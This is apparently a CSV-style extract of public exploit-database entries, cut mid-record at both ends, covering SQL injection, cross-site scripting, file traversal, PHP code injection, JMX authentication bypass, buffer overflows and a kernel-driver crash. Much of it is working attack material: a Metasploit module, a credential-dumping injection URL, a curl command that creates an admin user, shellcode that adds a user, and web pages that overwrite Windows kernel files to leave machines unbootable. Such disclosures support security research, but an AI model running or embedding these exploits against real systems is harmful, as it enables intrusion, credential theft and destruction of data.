Forums. 2015-04-27 Fix Requested via emails. 2015-04-29 Public disclosure.  Currently we are not aware of any official solution for this vulnerability. According to the vendor the plugin will not be supported anymore since 1st of June 2015: http://thecartpress.com/extend/important-note-nota-importante/  We recommend disabling or removing the vulnerable plugin as a workaround.  -----------------------------------------------------------------------------------------------  References:  [1] High-Tech Bridge Advisory HTB23254 - https://www.htbridge.com/advisory/HTB23254 - Multiple vulnerabilities in TheCartPress Wordpress plugin. [2] TheCartPress Wordpress plugin- http://thecartpress.com/ - Professional WordPress eCommerce Plugin. Use it as Shopping Cart, Catalog or Framework. [3] Common Vulnerabilities and Exposures (CVE) - http://cve.mitre.org/ - international in scope and free for public use, CVE® is a dictionary of publicly known information security vulnerabilities and exposures. [4] Common Weakness Enumeration (CWE) - http://cwe.mitre.org - targeted to developers and security practitioners, CWE is a formal list of software weakness types. [5] ImmuniWeb® SaaS - https://www.htbridge.com/immuniweb/ - hybrid of manual web application penetration test and cutting-edge vulnerability scanner available online via a Software-as-a-Service (SaaS) model.  -----------------------------------------------------------------------------------------------  Disclaimer: The information provided in this Advisory is provided ""as is"" and without any warranty of any kind. Details of this Advisory may be updated in order to provide as accurate information as possible. The latest version of the Advisory is available on web page [1] in the References.",['1.3.9'],1
6044,"Million Pixels 3 - 'id_cat' SQL Injection ################################################################# # #   Million Pixels 3 (id_cat) Remote SQL Injection Vulnerability # #======================================================== #                                                       = #    Author: Hussin X                                   = #                                                       = #    Home :  www.tryag.cc/cc #                                                       = #    email:  darkangel_g85[at]Yahoo[DoT]com             = #                                                       = #                                                       = #======================================================== #      # script : http://e-topbiz.com/oprema/pages/millionpixels3.php # # DorK  :  inurl: ""tops_top.php? id_cat =""      #################################################################  Exploit:     www.[target].com/Script/tops_top.php?id_cat=-5/**/UNION/**/SELECT/**/1,concat_ws(0x3a,UserName,Password)/**/from/**/tbl_admins/*     L!VE DEMO:   http://e-topbiz.com/trafficdemos/pixel3/tops_top.php?id_cat=-5/**/UNION/**/SELECT/**/1,concat_ws(0x3a,UserName,Password)/**/from/**/tbl_admins/*     ########################( Greetz )########################### #                                                           # # tryag.cc / DeViL iRaQ / IRAQ DiveR/ IRAQ_JAGUR /str0ke    # #                                                           #     #         Iraqihack / FAHD / mos_chori / Silic0n            # #                                                           # #############################################################                         Im IRAQi  # milw0rm.com [2008-07-11]",['3'],1
42693,"Viap Automation WinPLC7 5.0.45.5921 - Recv Buffer Overflow (Metasploit) require 'msf/core'  class MetasploitModule < Msf::Exploit::Remote 	Rank = GreatRanking  	include Msf::Exploit::Remote::TcpServer  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'VIPA Authomation WinPLC7 recv Stack Buffer Overflow', 			'Description'    => %q{ 				This module exploits a stack based buffer overflow found in VIPA 				Automation WinPLC7 <= 5.0.45.5921. The overflow is triggered when 				WinPLC7 connects to a remote server and accepts a malicious packet. 				The first 2 bytes of this packet are read in and used as the size 				value for a later recv function.  If a size value of sufficiently 				large size is supplied a stack buffer overflow will occur 			}, 			'Author'         => [ 'james fitts' ], 			'License'        => MSF_LICENSE, 			'References'     => 				[ 					[ 'ZDI', '17-112' ], 					[ 'CVE', '2017-5177' ], 					[ 'URL', 'https://ics-cert.us-cert.gov/advisories/ICSA-17-054-01' ] 				], 			'Privileged'     => false, 			'DefaultOptions' => 				{ 					'EXITFUNC' => 'process', 				}, 			'Payload'        => 				{ 					'Space'    => 500, 					'BadChars' => """", 					'StackAdjustment' => -3500 				}, 			'Platform'       => 'win', 			'Targets'        => 				[ 					[ 						'Windows 7 EN',  							{ 								# ws7v5.exe 								# jmp esp 								'Ret' => 0x00422354 							}  					], 				], 			'DefaultTarget' => 0, 			'DisclosureDate' => 'Feb 28 2017'))  		register_options( 			[ 				OptPort.new('SRVPORT', [ true, ""The port to listen on"", 7777]) 			], self.class) 	end  	def on_client_data(client) 		p = payload.encoded  		pkt =  ""\x13\x88\x00\x00\x00""	# len 		pkt += Rex::Text.pattern_create(5000)  		pkt[848, 4] = [target.ret].pack('V') 		pkt[852, p.length] = p  		client.put(pkt) 		handler 		service.close_client(client) 	end  end",['5.0.45.5921'],1
27911,vCard 2.9 - Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/18122/info  vCard is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.   An attacker may leverage these issues to have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  http://www.example.com/cards/toprated.php?page=[XSS] http://www.example.com/cards/newcards.php?page=[XSS],['2.9'],1
31005,"Sun Java System Identity Manager 6.0/7.0/7.1 - '/idm/account/findForSelect.jsp?resultsForm' Cross-Site Scripting source: https://www.securityfocus.com/bid/27214/info   Sun Java System Identity Manager is prone to multiple input-validation vulnerabilities, including an HTML-injection issue and cross-site scripting issues, because it fails to adequately sanitize user-supplied input.   Attackers can exploit these issues to execute arbitrary HTML and script code in the context of the affected site. Successful exploits could allow an attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user; other attacks are also possible.   Sun Java System Identity Manager 6.0 SP1, 6.0 SP2, 6.0 SP3, 7.0, and 7.1 are vulnerable.   https://www.example.com/idm/account/findForSelect.jsp?resultsForm=<script>alert(&#039;Running_scripting_within_the_context_of_&#039;%2bdocument.domain)</script>&predefinedQuery=name%3Astarts+with%3A%25",['6.0/7.0/7.1'],1
26640,GuppY 4.5 - 'archbatch.php?lng' Traversal Arbitrary File Access source: https://www.securityfocus.com/bid/15610/info   GuppY is affected by multiple local file include and information disclosure vulnerabilities.   An attacker may leverage these issues to execute arbitrary server-side script code that resides on an affected computer with the privileges of the Web server process. This may potentially facilitate unauthorized access.   It should be noted that these issues may also be leveraged to read arbitrary files on an affected computer with the privileges of the Web server. An attacker can employ directory traversal sequences and NULL characters to disclose arbitrary files.   GuppY 4.5.9 and prior versions are vulnerable.   http://www.example.com/[path_to_guppy]/admin/inc/archbatch.php?lng=../../../../../../../../../../../boot.ini%00,"['4.5', '4.5.9', 'prior versions']",1
35982,"Hewlett-Packard (HP) UCMDB - JMX-Console Authentication Bypass Mogwai Security Advisory MSA-2015-02 ---------------------------------------------------------------------- Title: Hewlett-Packard UCMDB - JMX-Console Authentication Bypass CVE-ID: CVE-2014-7883 Product: Hewlett-Packard Universal CMDB (UCMDB)     Affected versions: UCMDB 10.10 (Other versions might also be affected)  Impact: high Remote: yes Product link: http://www8.hp.com/us/en/software-solutions/configuration-management-system-database/index.html Reported: 14/11/2014  by: Hans-Martin Muench (Mogwai, IT-Sicherheitsberatung Muench)    Vendor's Description of the Software: ---------------------------------------------------------------------- The HP Universal CMDB (UCMDB) automatically collects and manages accurate and current business service definitions, associated infrastructure relationships and detailed information on the assets, and is a central component in many of the key processes in your IT organization, such as change management, asset management, service management, and business service management. The UCMDB ensures that these processes can rely on comprehensive and true data for all business services. Together with HP UCMDB Configuration Manager (UCMDB-CM) you can standardize your IT environments, and make sure they comply with clear policies, and defined authorization process. Many IT organizations turn to a CMDB and configuration management processes to create a shared single version of truth to support business service management, IT service management, change management, and asset management initiatives. These initiatives help align IT efforts with business requirements and run IT operations more efficiently and effectively. The initiatives success depends on the CMDB providing a complete view into the configuration items (CIs) and assets as well as how various IT elements relate together to deliver the business service. -----------------------------------------------------------------------  Business recommendation: ----------------------------------------------------------------------- Apply configuration changes from HP  https://softwaresupport.hp.com/group/softwaresupport/search-result/-/facetsearch/document/KM01351169   -- CVSS2 Ratings ------------------------------------------------------  CVSS Base Score: 6.4 Impact Subscore: 4.9 Exploitability Subscore: 10 CVSS v2 Vector (AV:N/AC:L/Au:N/C:P/I:P/A:N) -----------------------------------------------------------------------   Vulnerability description: ---------------------------------------------------------------------- UCMB administrators heavily rely on a JMX-Console, which is installed by default. The JMX-Console web application in UCMDB performs access control only for  the GET and POST methods, which allows remote attackers to send requests  to this application's GET handler by using a different method (for example HEAD).  The web.xml file of the JMX Console contains following security constrains:  <security-constraint> <web-resource-collection> <web-resource-name>Protected Pages</web-resource-name> <url-pattern>/*</url-pattern> <http-method>GET</http-method> <http-method>POST</http-method> </web-resource-collection> <auth-constraint> <role-name>sysadmin</role-name> </auth-constraint> </security-constraint>  <security-constraint> <web-resource-collection> <web-resource-name>Callhome Servlet</web-resource-name> <url-pattern>/callhome</url-pattern> <http-method>GET</http-method> <http-method>POST</http-method> </web-resource-collection> </security-constraint>  This vulnerability is identical with CVE-2010-0738 (JBoss JMX-Console  Authentication bypass). This can be used to create a new account which  can then be used to access the JMX console.   Proof of concept: ----------------------------------------------------------------------  The following Curl command will send a HEAD request to create a new user ""pocuser"" in the UCMDB Backend:  curl -I ""http://foobar:8080/jmx-console/HtmlAdaptor?action=invokeOpByName&name=UCMDB%3Aservice%3DAuthorization+Services&methodName=createUser&arg0=&arg1=zdi-poc&arg2=pocuser&arg3=zdi-poc&arg4=pocuser""  Disclosure timeline: ---------------------------------------------------------------------- 14/11/2014: Reporting issue to HP 18/11/2014: Re-Reporting, as no acknowledge received 18/11/2014: Acknowledge from HP 02/01/2015: Requesting status update from HP 29/01/2015: Requesting status update from HP 31/01/2015: Response from HP, they plan to release the advisory next week 02/05/2015: HP releases security bulletin 03/05/2015: Mogwai security bulletin release   Advisory URL: ---------------------------------------------------------------------- https://www.mogwaisecurity.de/#lab   References: ---------------------------------------------------------------------- Official HP security bulletin https://h20564.www2.hp.com/portal/site/hpsc/public/kb/docDisplay/?docId=emr_na-c04553906   ---------------------------------------------------------------------- Mogwai, IT-Sicherheitsberatung Muench Steinhoevelstrasse 2/2 89075 Ulm (Germany)  info@mogwaisecurity.de",['JMX-Console'],1
5874,"IPTBB 0.5.6 - 'act' Local File Inclusion   ____       _   _       _ ___   __                        _  __  / ___| ___ | \ | |_   _| | \ \ / /__  _   _ _ __ ___  ___| |/ _| ___  _ __ __ _ | |  _ / _ \|  \| | | | | | |\ V / _ \| | | | '__/ __|/ _ \ | |_ / _ \| '__/ _` | | |_| | (_) | |\  | |_| | | | | | (_) | |_| | |  \__ \  __/ |  _| (_) | | | (_| |  \____|\___/|_| \_|\__,_|_|_| |_|\___/ \__,_|_|  |___/\___|_|_|(_)___/|_|  \__, | ---------------------------------------------------------------------------|___/ Exploit found by sToRm  IPTBB is a free forum system built using PHP and mysql. Local File Inclusion  Local File Inclusion --------------------  index.php?act=../../../../../../etc/passwd%00   function action($page){ 	$page=""main/"".$page."".php""; 	//Include the template maker 	//Get the settings $setting = array(); $sql = mysql_query("" SELECT * FROM `iptbb_settings` "");  while ( $row = mysql_fetch_array( $sql ) ){ 	$setting[""{$row['name']}""] = $row['value']; }  	require_once('tpl.class.php'); 	$tpl = new template; 	$fileurl = 'templates/'; 	$template = $setting['template'] . '/'; 	include($page); }  # milw0rm.com [2008-06-20]",['0.5.6'],1
2303,"dsock 1.3 - 'buf' Remote Buffer Overflow (PoC) <!-- dsock <= 1.3 (buf) Remote Buffer Overflow PoC  Original Author: Michael Adams <parasite [a] sdf.lonestar.org>  A buffer overflow in variable 'buf' exists due to insufficient validation of variable 'name' in function tor_resolve line 218 of software at http://www.monkey.org/~dugsong/dsocks/  url PoC: DaveK  At a quick glance, this looks like it could indeed be overflowed quite trivially by passing an overlong name to any of the host lookup functions proxied by dsocks.  It therefore seems that it could quite easily be triggered remotely by, for example, a web page with an include/iframe using an overlong URL.   I would advise anyone currently using dsocks to click here:   -->   <a href=""http://fooaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaveryverylongname.com.invalid/"">Click Me For A Test Crash</a>  <!--  and if they crash their dsocks-enabled web-browser, to stop using it very quickly indeed.     cheers,      DaveK -->  # milw0rm.com [2006-09-05]",['1.3'],1
44619,"2345 Security Guard 3.7 - '2345NsProtect.sys' Denial of Service # Exploit Title: [BSOD  by IOCTL 0x8000200D in 2345NsProtect.sys  of 2345 Security Guard 3.7] # Date: [20180513] # Exploit Author: [anhkgg] # Vendor Homepage: [http://safe.2345.cc/] # Software Link: [http://dl.2345.cc/2345pcsafe/2345pcsafe_v3.7.0.9345.exe] # Version: [v3.7] (REQUIRED) # Tested on: [Windows X64] # CVE : [CVE-2018- 11034]  #include <windows.h> #include <stdio.h>  struct NETFW_IOCTL_ADD_PID { 	DWORD pid; 	char seed[0x14];// };//0x18  struct NETFW_IOCTL_SET_PID { 	BYTE set_state;//  	BYTE unk;//1 	WORD buf_len;//2 	DWORD pid;//4 	char buf[0x64];//8 };//6c  struct NETFW_IOCTL_222040 { 	DWORD* ptr; 	DWORD size; };//  int __stdcall f_XOR__12A30(BYTE *a1, BYTE *a2) { 	int result;   	*a1 ^= *a2; 	*a2 ^= *a1; 	result = (unsigned __int8)*a2; 	*a1 ^= result; 	return result; }  int __stdcall sub_12A80(char *a1, int len, char *a3) { 	int result; 	unsigned __int8 v4; 	__int16 i; 	__int16 j; 	unsigned __int8 k;   	for ( i = 0; i < 256; ++i ) 		a3[i] = i; 	a3[256] = 0; 	a3[257] = 0; 	k = 0; 	v4 = 0; 	result = 0; 	for ( j = 0; j < 256; ++j ) 	{ 		v4 += a3[j] + a1[k]; 		f_XOR__12A30((BYTE*)&a3[j], (BYTE*)&a3[v4]); 		result = (k + 1) / len; 		k = (k + 1) % len; 	} 	return result; }  char *__stdcall sub_12B60(char *a1, signed int len, char *a3) { 	char *result; 	__int16 i;  	unsigned __int8 v5;  	unsigned __int8 v6;  	v5 = a3[256]; 	v6 = a3[257]; 	for ( i = 0; i < len; ++i ) 	{ 		v6 += a3[++v5]; 		f_XOR__12A30((BYTE*)&a3[v5], (BYTE*)&a3[v6]); 		a1[i] ^= a3[(unsigned __int8)(a3[v6] + a3[v5])]; 	} 	a3[256] = v5; 	result = a3; 	a3[257] = v6; 	return result; }  void calc_seed(char* seed, char* dst) { 	char Source1[26] = {0}; 	char a3[300] = {0};  	Source1[0] = 8; 	Source1[1] = 14; 	Source1[2] = 8; 	Source1[3] = 10; 	Source1[4] = 2; 	Source1[5] = 3; 	Source1[6] = 29; 	Source1[7] = 23; 	Source1[8] = 13; 	Source1[9] = 3; 	Source1[10] = 15; 	Source1[11] = 22; 	Source1[12] = 15; 	Source1[13] = 7; 	Source1[14] = 91; 	Source1[15] = 4; 	Source1[16] = 18; 	Source1[17] = 26; 	Source1[18] = 26; 	Source1[19] = 3; 	Source1[20] = 4; 	Source1[21] = 1; 	Source1[22] = 15; 	Source1[23] = 25; 	Source1[24] = 10; 	Source1[25] = 13;  	sub_12A80(seed, 0x14, a3);              	sub_12B60(Source1, 0x1A, a3); 	memcpy(dst, Source1, 26); }  int poc_2345NetFirewall() { 	HANDLE h = CreateFileA(""\\\\.\\2345NetFirewall"", 		GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE, 		NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); 	if(h == INVALID_HANDLE_VALUE) { 		printf(""[-] Open device error: %d\n"", GetLastError()); 		return 1; 	} 	DWORD BytesReturned = 0;  	DWORD ctlcode = 0x222298; 	NETFW_IOCTL_ADD_PID add_pid = {0}; 	add_pid.pid = GetCurrentProcessId();  	if(!DeviceIoControl(h, ctlcode, &add_pid, sizeof(NETFW_IOCTL_ADD_PID), &add_pid, sizeof(NETFW_IOCTL_ADD_PID), &BytesReturned, NULL)) { 		printf(""[-] DeviceIoControl %x error: %d\n"", ctlcode, GetLastError()); 	}  	ctlcode = 0x2222A4; 	NETFW_IOCTL_SET_PID set_pid = {0}; 	set_pid.pid = GetCurrentProcessId(); 	set_pid.set_state = 1;  	calc_seed(add_pid.seed, set_pid.buf); 	set_pid.buf_len = 26;  	if(!DeviceIoControl(h, ctlcode, &set_pid, sizeof(NETFW_IOCTL_SET_PID), &set_pid, sizeof(NETFW_IOCTL_SET_PID), &BytesReturned, NULL)) { 		printf(""[-] DeviceIoControl %x error: %d\n"", ctlcode, GetLastError()); 	}  	//BSOD 	ctlcode = 0x222040; 	NETFW_IOCTL_222040 buf_222040 = {0}; 	buf_222040.size = 1; 	buf_222040.ptr = (DWORD*)0x80000000; 	if(!DeviceIoControl(h, ctlcode, &buf_222040, sizeof(NETFW_IOCTL_222040), &buf_222040, sizeof(NETFW_IOCTL_222040), &BytesReturned, NULL)) { 		printf(""[-] DeviceIoControl %x error: %d\n"", ctlcode, GetLastError()); 	}  	return 0; }  int main() { 	poc_2345NetFirewall(); 		 	return 0; }",['3.7'],1
46536,"Microsoft Windows MSHTML Engine - 'Edit' Remote Code Execution # Exploit Title:  Microsoft Windows (CVE-2019-0541) MSHTML Engine ""Edit"" Remote Code Execution Vulnerability  # Google Dork: N/A  # Date: March, 13 2019  # Exploit Author:  Eduardo Braun Prado  # Vendor Homepage: http://www.microsoft.com/  # Software Link: http://www.microsoft.com/  # Version: Windows 7 SP1, Server 2008, Server 2012, Server 2012 R2, 8.0, 8.1, 10 (any) with full patches up to December 2018. both x86 and x64 architectures.  # Tested on: Windows 7 SP1, Server 2008, Server 2012, Server 2012 R2, 8.0, 8.1, 10 (any) with full patches up to December 2018. both x86 and x64 architectures.  # CVE : CVE-2019-0541   The Microsoft Windows MSHTML Engine is prone to a vulnerability that allows attackers to execute arbitrary code on vulnerable systems because of improper validation of specially crafted web documents (html, xhtml, etc). The issue is triggered when users ""Edit"" specially crafted documents containing a 'meta' HTML tag set to 'ProgId' and its content set to a 'ProgId' of choice eg. 'HTAFILE', usually through MS IE browser or a MS Office component (The Edit HTML app 'msohtmed.exe'). Some Office versions will add an ""Edit"" menu option to html and xhtml files, making it possible to exploit the vulnerability locally or remotely (usually through network shares) This is the 'ProgId' exploit: Similar to the old Windows Shell / Internet Explorer ClassId vulnerabilit(ies) that haunted Windows 98/2000/XP in the past.'. On patched systems, the PoC file will always open in Notepad.   Video demo: https://youtu.be/OdEwBY7rXMw   Download PoC (in ZIP archive) with full details from: https://onedrive.live.com/?id=AFCB9116C8C0AAF4%21366&cid=AFCB9116C8C0AAF4   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/46536.zip","['7', '2008', '8.0 8.1 10', '7 SP1', '2008 Server', '2012', 'R2 8.0 8.1 10']",1
4757,"HP Software Update Client 3.0.8.4 - Multiple Vulnerabilities Advisory: /////////   There is another remotely exploitable flaw within software preinstalled  in HP notebook machines. This time, the culprit is automatic software  update tool provided by the vendor.The Potential exploitation may lead  to user files loss or altering vital system files (e.g. kernel), thus  leaving PC unbootable.   Overview: /////////   The flaw is located in the software called HP Software Update shipped  with the HP notebooks to support automatic software updates and critical  vulnerability patching. One of the ActiveX controls deployed by default  by the vendor contains an insecure method giving a potential attacker  the remote system arbitrary file write access.   Impact: ///////   Remote user files contents corruption Remote system kernel files damage  / Operating System DoS condition   Attack vectors: ///////////////   There are two main attack vector schemes:   - inducing remote user to launch WWW link after obtaining the  information about the location of an arbitrary file(s) locations/names  in the remote system. After clicking the link the files contents will be  unrecoverably destroyed. This attack vector thus requires additional  social engineering of the vitim to acquire exact name and location of  the potential attack target files. - inducing remote user to launch WWW  link resulting in corruption of vital Operating System files, leaving  the system unusable. This attack vector DOESN'T require any additional  victim social engineering, because the system files are always placed in  the predictable locations.   Technical details: //////////////////   The vulnerable ActiveX control EngineRules.dll is a component of HP  Software Updates system designed by the vendor.   It has assigned CLSID: 7CB9D4F5-C492-42A4-93B1-3F7D6946470D and is by  default included to ""Safe for Scripting"" OLE components, that allows  full execution scripting access to the control methods from within the  browser.   The default control installation path is C:\Program  Files\Hewlett-Packard\eSupportDiags\RulesEngine.dll   The control is used by the the HP Software Updates software's  HPWUCli.exe client application to enumerate, load and store available  software patches information. The HPWUCli.exe binary is located in the  directory: C:\Program Files\HP\HP Software Update\   The control may also be used by a remote WWW service, such as  Hewlett-Packard online software update service.   The potentialy insecure method is: void SaveToFile(String dataFilePath);   This method is used to store the software patch specific data (version,  remote location, vendor name, software description) in the binary file  beginning with the 32bit integer value containing the actual patches  count stored in the data file.   The problem lies in the lack of distinguish between local and global  data file area in this control. Both LoadDataFromFile() method and  SaveDataToFile() method have an access to the entire file system data  area, therefore any arbitrary user file can be accessed remotely using  one of these methods by a remote entity. Use the SaveDataToFile() can be  exploited to store the empty-by-initialize software patch data in the  existing file, which will result in previous file contents loss and  resetting it to 4 zero-bytes, describing a zero-size patch.   Noticing a specific vulnerability location (vendor's software update  system), simple disabling of the vulnerable control by the vendor's  patch (like in the other HP software vulnerbility case - HPInfo) would  result in the machine software update system compromise in this case and  would leave the user vulnerable to the future security issues.   Therefore reimplemetation of the update system and/or vulnerable control  local data area implementation is strongly recommended.   Remote Kernel Wreckage Exploit //////////////////////////////   Using this flaw one can construct an armed exploit, able for example to  destroy remote system kernel files and make the remote machine  UNBOOTABLE. The exploit is using vulnerable SaveToFile() to overwrite  the NT System kernel files with the 4 zero bytes. The target are memory  mapped ntoskrnl.exe and ntkrnlpa.exe kernel files which don't have a  write lock set on them and may be opened for write. Although Windows NT  system contains a protection for this kind of activity (system files  overwrite) it can be fooled by overwriting simultanously: system binary  files backup directory (\System32\DllCache\) actual system kernel files  (\System32\) and the Driver Backup directory (\Windows\Driver Cache\)  kernel files.   After the execution it will store an zero-initialized patch information  using SaveToFile() method sequentially to ntoskrnl.exe, ntkrnlpa.exe,  ntkrnlmp.exe ,ntkrpamp.exe NT kernel files , first in the  System32\DllCache\ directory, second to \System32\ directory and finally  to Windows\Driver Cache\ dir. After the very next OS shutdown, machine  will not be bootable anymore.   The exploit code has been attached to the end of this advisory. NOTE  however that it is provided ONLY as a Proof of Concept code and has been  released ONLY to estimate the impact level of the issue.   Vulnerable Software: ////////////////////   HP Software Update client v3.0.8.4 RulesEngine.dll ActiveX CTL v1.0   Internet Explorer 6.0 Internet Explorer 7.0   Windows XP Home Windows XP Pro Windows 2000 Windows 2003 Windows Vista   Vulnerable Hardware ///////////////////   Every HP notebook machine containing the HP Software Updates application  is vulnerable. It is possible that the vulnerable machine model list  disclosed by the vendor as a confirmation to the previous issue  concerning HP laptops - ""HP Info Center"" case, will be similar in this  case.   Exploits: /////////   ////////////////////////////////////////// //Remote Arbitrary File Corruption Exploit //////////////////////////////////////////   <html> <head> <script language=""JavaScript"">   var filePath=""c:\\temp\\testfile.txt"";   function spawn3() { o2obj.SaveToFile(filePath); }   </script> </head>   <body onload=""spawn3()""> <object ID=""o2obj"" WIDTH=0 HEIGHT=0 classid=""clsid:7CB9D4F5-C492-42A4-93B1-3F7D6946470D"" </object> </body>  </html>   //////////////////////////////// //Remote Kernel Wreckage Exploit  //////////////////////////////// // // // WARNING! THE REAL THING... //  DON'T TRY THIS AT HOME! // THIS WILL DAMAGE YOUR // HP COMPUTER SYSTEM!!! // // ////////////////////////////////   <html> <head> <script language=""JavaScript"">   function spawn3() {   o2obj.EvaluateRules();   o2obj.SaveToFile(""c:\\WINDOWS\\system32\\dllcache\\ntoskrnl.exe"");  o2obj.SaveToFile(""c:\\WINDOWS\\system32\\dllcache\\ntkrnlpa.exe"");  o2obj.SaveToFile(""c:\\WINDOWS\\system32\\dllcache\\ntkrnlmp.exe"");  o2obj.SaveToFile(""c:\\WINDOWS\\system32\\dllcache\\ntkrpamp.exe"");   o2obj.SaveToFile(""c:\\WINDOWS\\system32\\ntoskrnl.exe"");  o2obj.SaveToFile(""c:\\WINDOWS\\system32\\ntkrnlpa.exe"");   o2obj.SaveToFile(""c:\\WINDOWS\\Driver Cache\\i386\\ntoskrnl.exe"");  o2obj.SaveToFile(""c:\\WINDOWS\\Driver Cache\\i386\\ntkrnlpa.exe"");  o2obj.SaveToFile(""c:\\WINDOWS\\Driver Cache\\i386\\ntkrnlmp.exe"");  o2obj.SaveToFile(""c:\\WINDOWS\\Driver Cache\\i386\\ntkrpamp.exe"");   o2obj.SaveToFile(""c:\\WINDOWS\\Driver Cache\\i386\\sp2.cab"");  o2obj.SaveToFile(""c:\\WINDOWS\\Driver Cache\\i386\\driver.cab""); }   function meltdown() { spawn3(); spawn3(); spawn3(); }   </script> </head>   <body onload=""meltdown()""> <object ID=""o2obj"" WIDTH=0 HEIGHT=0  classid=""clsid:7CB9D4F5-C492-42A4-93B1-3F7D6946470D"" </object> </body>  </html>   Related final word: ///////////////////   Spiderpig, spiderpig, does whatever the spiderpig does... ;-)   Links: //////   Original advisory link:  www.anspi.pl/~porkythepig/hp-issue/wyfukanyszynszyl.txt   Credits: ////////   Issue discovery and research: porkythepig Contact: porkythepig@anspi.pl   # milw0rm.com [2007-12-19]",['3.0.8.4'],1
40084,"IPS Community Suite 4.1.12.3 - PHP Code Injection --------------------------------------------------------------------------- IPS Community Suite <= 4.1.12.3 Autoloaded PHP Code Injection Vulnerability ---------------------------------------------------------------------------   [-] Software Link:  https://invisionpower.com/   [-] Affected Versions:  Version 4.1.12.3 and prior versions.   [-] Vulnerability Description:  The vulnerable code is located in the /applications/core/modules/front/system/content.php script:  38.	$class = 'IPS\\' . implode( '\\', explode( '_', \IPS\Request::i()->content_class ) ); 39.	 40.	if ( ! class_exists( $class ) or ! in_array( 'IPS\Content', class_parents( $class ) ) ) 41.	{ 42.	    \IPS\Output::i()->error( 'node_error', '2S226/2', 404, '' ); 43.	}  User input passed through the ""content_class"" request parameter is not properly sanitized before being used in a call to the ""class_exists()"" function at line 40. This could be exploited by unauthenticated attackers to inject and execute arbitrary PHP code leveraging the autoloading function defined into the /applications/cms/Application.php script:  171.	if ( mb_substr( $class, 0, 14 ) === 'IPS\cms\Fields' and is_numeric( mb_substr( $class, 14, 1 ) ) ) 172.	{ 173.	    $databaseId = mb_substr( $class, 14 ); 174.	    eval( ""namespace IPS\\cms; class Fields{$databaseId} extends Fields { public static \$customDatabaseId [...] 175.	}  Successful exploitation of this vulnerability requires the application running on PHP before version 5.4.24 or 5.5.8.   [-] Proof of Concept:  http://[host]/[ips]/index.php?app=core&module=system&controller=content&do=find&content_class=cms\Fields1{}phpinfo();/*   [-] Solution:  Update to version 4.1.13 or later.   [-] Disclosure Timeline:  [04/07/2016] - Vendor notified [05/07/2016] - Vulnerability fixed in version 4.1.13: https://invisionpower.com/release-notes/4113-r44/ [06/07/2016] - CVE number requested [06/07/2016] - CVE number assigned [07/07/2016] - Public disclosure   [-] CVE Reference:  The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the name CVE-2016-6174 to this vulnerability.   [-] Credits:  Vulnerability discovered by Egidio Romano.   [-] Original Advisory:  http://karmainsecurity.com/KIS-2016-11","['4.1.12.3', '<=', 'prior versions', '4.1.13']",1
23059,Netbula Anyboard 9.9.5 6 - Information Disclosure source: https://www.securityfocus.com/bid/8490/info  A vulnerability has been reported in Netbula Anyboard that may allow a remote attacker to gain access to sensitive data. This problem is due to an information disclosure issue that can be triggered by an attacker sending specific HTTP requests to a vulnerable host. This will result in sensitive information about the system being revealed to the attacker.  This vulnerability may allow an attack to gather sensitive information in order to launch further attacks against a vulnerable system.   http://www.example.com/cgi-bin/anyboard.cgi/?cmd=sinfo&all=1,['9.9.5 6'],1
23091,"FloosieTek FTGatePro 1.22 - Mail Server Full Path Disclosure source: https://www.securityfocus.com/bid/8527/info  FloosieTek FTGatePro Mail Server may disclose its installation path to remote attackers. This information could be useful when mounting further attacks against the system.  This issue exists in the web administrative interface, which listens on port 8089 by default.   http://www.example.com:8089/utility/wmsecurity.fts",['1.22'],1
9644,"Kolibri+ Web Server 2 - GET Remote Overwrite (SEH) #!/usr/bin/python # # Could not get this to work on XP SP3. php5ts.dll is the only module with safe seh off but could not get the pop pop ret # to work correctly despite the large number of usable addresses that were tested. # # $ ./kolibri.py 192.168.1.146 8080 # # [*] Kolibri+ Webserver 2 SEH Overwrite # [*] Written by blake # [*] Tested on Windows XP SP 1 # [*] Denial of Service found by Usman Saeed # # [+] Connecting to 192.168.1.146 on port 8080 # [+] Sending payload # [+] Done. User jenny created with the password of pass on 192.168.1.146  import socket, sys  print ""\n[*] Kolibri+ Webserver 2 SEH Overwrite"" print ""[*] Written by blake"" print ""[*] Tested on Windows XP SP 1"" print ""[*] Denial of Service found by Usman Saeed\n""  if len(sys.argv)!= 3: 	print ""[*] Usage: %s <ip> <port>"" 	sys.exit(0)  host = sys.argv[1] port = int(sys.argv[2])  # windows/adduser - 446 bytes Encoder: x86/alpha_mixed # USER=jenny, EXITFUNC=seh, PASS=pass  shellcode = ( ""\x89\xe6\xdb\xc8\xd9\x76\xf4\x5f\x57\x59\x49\x49\x49\x49\x49"" ""\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"" ""\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"" ""\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"" ""\x4b\x4c\x4b\x58\x47\x34\x45\x50\x43\x30\x43\x30\x4c\x4b\x50"" ""\x45\x47\x4c\x4c\x4b\x43\x4c\x43\x35\x42\x58\x43\x31\x4a\x4f"" ""\x4c\x4b\x50\x4f\x42\x38\x4c\x4b\x51\x4f\x51\x30\x43\x31\x4a"" ""\x4b\x50\x49\x4c\x4b\x46\x54\x4c\x4b\x45\x51\x4a\x4e\x50\x31"" ""\x49\x50\x4c\x59\x4e\x4c\x4b\x34\x49\x50\x44\x34\x45\x57\x49"" ""\x51\x48\x4a\x44\x4d\x43\x31\x49\x52\x4a\x4b\x4b\x44\x47\x4b"" ""\x51\x44\x51\x34\x45\x54\x43\x45\x4a\x45\x4c\x4b\x51\x4f\x46"" ""\x44\x45\x51\x4a\x4b\x43\x56\x4c\x4b\x44\x4c\x50\x4b\x4c\x4b"" 